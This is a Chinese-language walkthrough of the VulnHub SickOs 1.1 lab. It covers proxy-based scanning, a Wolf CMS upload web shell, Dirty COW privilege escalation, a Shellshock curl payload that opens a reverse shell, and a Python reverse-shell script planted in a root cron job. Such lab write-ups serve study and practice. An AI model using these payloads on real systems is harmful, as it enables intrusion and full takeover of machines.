同上一个文章一样，这个也是vulnhub中的一个与OSCP有关的靶场。

靶场地址 ：[SickOs: 1.1 ~ VulnHub](https://www.vulnhub.com/entry/sickos-11,132/)

这个靶场自己打的时候在端口扫描后卡住了，之前不了解squid，看了别人的writeup才知道了（就看了一眼，往下都是自己搞出来的）。其实很简单，我理解的是就是一个代理，可以通过它提供的代理端口来访问正常情况下访问不了的一些网页。

## 主机发现

    
    
    arp-scan -l

![1648563665_624315d15c7db66229e13.png!small](https://image.3001.net/images/20220329/1648563665_624315d15c7db66229e13.png!small)

目标ip为192.168.1.12

## 端口扫描

    
    
    nmap -sV -sC -T4  192.168.1.12  -p- 
    -sV:查看端口对应服务
    -sC：使用默认脚本测试
    -T4:快速测试
    -p-:全端口扫描

![1648564152_624317b8ab62a2f23cb47.png!small](https://image.3001.net/images/20220329/1648564152_624317b8ab62a2f23cb47.png!small)

扫描完成，看到3128端口，尝试访问一下

![1648563904_624316c0a5b6f62ff7ebd.png!small](https://image.3001.net/images/20220329/1648563904_624316c0a5b6f62ff7ebd.png!small)

我在这里卡了很久，根据他的左下角版本信息搜了一下漏洞，还真有一个对应版本的绕过访问限制，不过试了很久都没成功，这里压根没想他的功能，实在过不去了，看了一下他的writeup才知道原来这个端口是http-proxy代理，要通过这个端口来访问他的web服务。

用proxyfox配一下代理

![1648564203_624317eb634ee260b6b66.png!small](https://image.3001.net/images/20220329/1648564203_624317eb634ee260b6b66.png!small)

![1648564229_62431805cc79b960ebee3.png!small](https://image.3001.net/images/20220329/1648564229_62431805cc79b960ebee3.png!small)

## 目录爆破

再次访问，发现正常显示，不过页面很简单，目录爆破一下

    
    
    dirb http://192.168.1.12 -p 192.168.1.12:3128    
    # -p 是指定代理 

![1648564551_624319478dbc960201811.png!small](https://image.3001.net/images/20220329/1648564551_624319478dbc960201811.png!small)

可以看到有个connect，可以直接下载是个py文件，内容如下

![1648564616_62431988e68c94becc1d5.png!small](https://image.3001.net/images/20220329/1648564616_62431988e68c94becc1d5.png!small)

其实他就是提权的关键，但是我没用到，还是因为脑子比较笨，感觉他有问题但是没找到方法

再访问一下robots.txt

![1648564769_62431a2159430365a6d9a.png!small](https://image.3001.net/images/20220329/1648564769_62431a2159430365a6d9a.png!small)

看到这个就比较兴奋了，访问一下

## cms漏洞getshell

![1648564806_62431a46a98e1b75706b0.png!small](https://image.3001.net/images/20220329/1648564806_62431a46a98e1b75706b0.png!small)

这是个cms，之前还没听说过，此处省略在这个页面找漏洞的过程，找了个寂寞

使用searchsploit 找一下有没有漏洞吧

![1648565068_62431b4c2cfedf7e3991a.png!small](https://image.3001.net/images/20220329/1648565068_62431b4c2cfedf7e3991a.png!small)

还真有，凭借着敏锐的嗅觉（其实也因为它排第一个），我直接查看上图红框中的内容

![1648565264_62431c1009ef8e5df1072.png!small](https://image.3001.net/images/20220329/1648565264_62431c1009ef8e5df1072.png!small)

文件中写的很清楚了，我们直接访问这个链接看一下有没有这个界面

![1648565319_62431c4791c1864a37337.png!small](https://image.3001.net/images/20220329/1648565319_62431c4791c1864a37337.png!small)

有个登陆界面，到这里剩下的我感觉太顺了

登陆界面直接，admin:admin登陆进去

然后就是根据exploit中的创建文件然后访问执行

![1648565422_62431cae3b6dba312828e.png!small](https://image.3001.net/images/20220329/1648565422_62431cae3b6dba312828e.png!small)

shell.php就是我创建的文件，然后点击该文件就能够编辑

尝试执行以下系统命令看能不能成功

先向shell.php写入命令

![1648565583_62431d4f3fd77c13f6346.png!small](https://image.3001.net/images/20220329/1648565583_62431d4f3fd77c13f6346.png!small)

点击保存后访问

<http://192.168.1.12/wolfcms/public//shell.php>

![1648565689_62431db9e340d6d1a4fb6.png!small](https://image.3001.net/images/20220329/1648565689_62431db9e340d6d1a4fb6.png!small)

成功执行

然后就是写入一句话，蚁剑连接

![1648565737_62431de9316151b038bb3.png!small](https://image.3001.net/images/20220329/1648565737_62431de9316151b038bb3.png!small)

注意蚁剑这里也要配置代理

![1648565790_62431e1ed27c33c0b7436.png!small](https://image.3001.net/images/20220329/1648565790_62431e1ed27c33c0b7436.png!small)

![1648565824_62431e40df694c4a0cbad.png!small](https://image.3001.net/images/20220329/1648565824_62431e40df694c4a0cbad.png!small)

![1648565945_62431eb92bc13a726c43e.png!small](https://image.3001.net/images/20220329/1648565945_62431eb92bc13a726c43e.png!small)

## 权限提升

从蚁剑进入终端，找一下有没有suid提权或者sudo提权

![1648566038_62431f160fb558eed986a.png!small](https://image.3001.net/images/20220329/1648566038_62431f160fb558eed986a.png!small)

好像都没有，这里直接上传一个linux-suggest文件，他能检测该系统有什么漏洞可以利用

工具连接：[mzet-/linux-exploit-suggester: Linux privilege escalation auditing tool
(github.com)](https://github.com/mzet-/linux-exploit-suggester)

为了方便把他改名为s.sh,给他运行权限并执行

    
    
    chmod 777 s.sh
    ./sh

![1648566242_62431fe267ad7c56568e3.png!small](https://image.3001.net/images/20220329/1648566242_62431fe267ad7c56568e3.png!small)

执行完毕后有很多漏洞，不过提权的只有一个脏牛

这里简单说一下脏牛提权

![1648566503_624320e70a2b641aa2aac.png!small](https://image.3001.net/images/20220329/1648566503_624320e70a2b641aa2aac.png!small)

那就上传脏牛提权文件（通过蚁剑拖拽就能上传），然后编译执行

    
    
    gcc -pthread dirty.c -o exp3 -lcrypt
    #编译dirty.c文件并保存为exp3  
    ./exp3 123  
    #执行exp3后面跟的是更改后的密码，该脚本默认将原root用户名字更改为firefart,所以一旦提权成功，直接su firefart 然后输入刚刚更改的密码就能切换到root用户

![1648566662_62432186421395b0d6d0f.png!small](https://image.3001.net/images/20220329/1648566662_62432186421395b0d6d0f.png!small)

执行完这些命令后就可以看到/etc/passwd中的root用户的信息已经更改为firefart,后面就是我们刚刚更改的密码123的加密值

这里发现无法通过su切换用户，但可以通过ssh连接

不过这有一个问题就是，提权完成后大约10秒左右靶机就会崩溃，但是我还是凭借着超高的手速查看到了。root目录下的flag

![1648566825_62432229c5d928b25d170.png!small](https://image.3001.net/images/20220329/1648566825_62432229c5d928b25d170.png!small)

这就是我的一个打靶过程，有点狗，感觉这不是作者规划的解题思路(至少提权那里不是)，毕竟提权完成后机器会很快崩溃，但是我不愿意再试了，然后就看了一下其他人的wp，发现是用我前面发现的那个connect.py提权，而且getshell是通过shellshock（破壳）来实现的，这里复现一下大佬们的过程顺便学习一下。

到配置http-proxy基本一样，然后是使用nikto扫描网站

    
    
    nikto -useproxy http://192.168.0.71:3128 -host http://192.168.0.71 
     
    #-userproxy 指定代理 这里是在公司复现的ip换了

![1648611571_6243d0f35ab92bbc513ae.png!small?1648611571842](https://image.3001.net/images/20220330/1648611571_6243d0f35ab92bbc513ae.png!small?1648611571842)

这里检测出/cgi-bin/status这里可能存在shellshock漏洞，这里简单了解一下这个漏洞。

##  **漏洞原理**

目前的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。

可以到这个文章中看一下，作者讲的很详细。

[Bash远程代码执行漏洞“破壳”（CVE-2014-6271）分析 | 下一代反病毒引擎创造者
(antiy.com)](https://www.antiy.com/response/CVE-2014-6271.html)

使用curl 测试一下有无漏洞

    
    
    curl --proxy 192.168.0.71:3128 -H  'x: () { :;};a= `/bin/id`;echo $a  ' http://192.168.0.71/cgi-bin/status
    
    

![1648614904_6243ddf8bc33c4376f8e1.png!small?1648614905158](https://image.3001.net/images/20220330/1648614904_6243ddf8bc33c4376f8e1.png!small?1648614905158)

没有回显id，不过返回了系统信息，尝试一下反弹shell

先在本机开启监听

![1648615112_6243dec83d2ab70d01711.png!small](https://image.3001.net/images/20220330/1648615112_6243dec83d2ab70d01711.png!small)

然后执行下面这条命令反弹shell

    
    
      
    curl --proxy 192.168.0.71:3128 -H  'x: () { :;};  /bin/bash -i >&  /dev/tcp/192.168.0.48/8888 0>&1 ' http://192.168.0.71/cgi-bin/status

反弹成功

![1648615172_6243df04867c7d34b2036.png!small?1648615172928](https://image.3001.net/images/20220330/1648615172_6243df04867c7d34b2036.png!small?1648615172928)

因为connect.py比较可疑，它的所有者是root，但是任何用户都可以进行读写执行

![1648615267_6243df63461baca1a8f0a.png!small?1648615267677](https://image.3001.net/images/20220330/1648615267_6243df63461baca1a8f0a.png!small?1648615267677)

这里查看一下计划任务，linux计划任务存放在/etc/cron*/文件中,

> /etc/cron.hourly/ 目录下存放的是系统每小时要做的任务可执行脚本
>
> /etc/cron.daily/ 目录下存放的是系统每天要做的任务可执行脚本
>
> /etc/cron.weekly/ 目录下存放的是系统每周要做的任务可执行脚本
>
> /etc/cron.monthly/ 目录下存放的是系统每月要做的任务可执行脚本

这些是可执行脚本，不是cron配置文件，crond服务通过run-parts 工具调用执行这些脚本  
除了上面这几个存放定时任务的脚本外还有一个重要的文件cron.d,他是我们解题的关键，它的作用如下

当我们要增加全局性的计划任务时，一种方式是直接修改/etc/crontab。但是，一般不建议这样做，/etc/cron.d目录就是为了解决这种问题而创建的。

例如，增加一项定时的备份任务，我们可以这样处理：在/etc/cron.d目录下新建文件backup.sh，内容如下：

    
    
    # m h dom mon dow user command
    * 1 * * * root /sbin/mon_zetc_logtar.sh

cron进程执行时，就会自动扫描该目录下的所有文件，按照文件中的时间设定执行后面的命令。

cron执行时，也就是要读取三个地方的配置文件：一是/etc/crontab，二是/etc/cron.d目录下的所有文件，三是每个用户的配置文件

因此我们使用以下命令查看相关计划任务

    
    
    ls -al /etc/cron*  
    查看etc目录下所有以cron开头的文件

![1648646757_62445a65924a9d9bc6572.png!small?1648646758304](https://image.3001.net/images/20220330/1648646757_62445a65924a9d9bc6572.png!small?1648646758304)

最终在cron.d中的automate找到关于connect.py的信息

![1648646829_62445aad808de9655cb4c.png!small?1648646829980](https://image.3001.net/images/20220330/1648646829_62445aad808de9655cb4c.png!small?1648646829980)

上图方框中从左到右分别代表分，时，日，月，周，这里五个星号表示每分钟都会执行。

因此我们可以得出这个connect.py每分钟都会以root用户执行，而且我们可以以普通用户的身份修改这个文件。这里就有好几种方法查看flag文件了，可疑使用python
os.system执行命令反弹shell，也可以直接使用python反弹shell，也可以给root目录增大权限所有用户都可以访问，甚至修改etc/passwd中用户的权限，这里我们就用反弹shell的形式提权。

但是我这里没办法直接使用vim修改connect.py，这样他会断开，使用python的pty获得相对稳定的shell还是没办法使用vim编辑，我这里直接在我攻击机上先写好代码(shell.py)，使用wget获取下载到靶机。

python代码如下

    
    
    #!/bin/python
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.15",8888))
    os.dup2(s.fileno(),0) 
    os.dup2(s.fileno(),1) 
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])

然后在攻击机当前路径开启http服务

![1648648245_624460350c999951ea82f.png!small?1648648245513](https://image.3001.net/images/20220330/1648648245_624460350c999951ea82f.png!small?1648648245513)

在靶机使用

wget获取python脚本

![1648648276_6244605422d1477ad3f0b.png!small?1648648276596](https://image.3001.net/images/20220330/1648648276_6244605422d1477ad3f0b.png!small?1648648276596)

使用cat命令将shell.py复制到connect.py中

![1648648474_6244611a267fd42e499d0.png!small?1648648474698](https://image.3001.net/images/20220330/1648648474_6244611a267fd42e499d0.png!small?1648648474698)

然后断开连接，重新在攻击机开启监听 8888端口，等了半分钟，成功反弹shell

![1648648510_6244613e1feda5d4a37ee.png!small?1648648510525](https://image.3001.net/images/20220330/1648648510_6244613e1feda5d4a37ee.png!small?1648648510525)

查看flag

![1648648570_6244617aac35bb5f4fc27.png!small?1648648571192](https://image.3001.net/images/20220330/1648648570_6244617aac35bb5f4fc27.png!small?1648648571192)

这个靶场到此结束！如果有大佬看到此文章，发现有不对的地方还望指正。

### 参考链接

> [Linux /etc/cron.d作用（转自 定时任务crontab cron.d） - 林枫水湾湾 - 博客园
> (cnblogs.com)](https://www.cnblogs.com/hubavyn/p/4607094.html)
>
> [(12条消息) 搞它！！！Linux系统中查看进程和计划任务管理_不吃小白菜的博客-> CSDN博客](https://blog.csdn.net/weixin_47219935/article/details/106961655)
>
> [Bash远程代码执行漏洞“破壳”（CVE-2014-6271）分析 | 下一代反病毒引擎创造者
> (antiy.com)](https://www.antiy.com/response/CVE-2014-6271.html)
>
> https://blog.christophetd.fr/write-up-sickos-1-1/

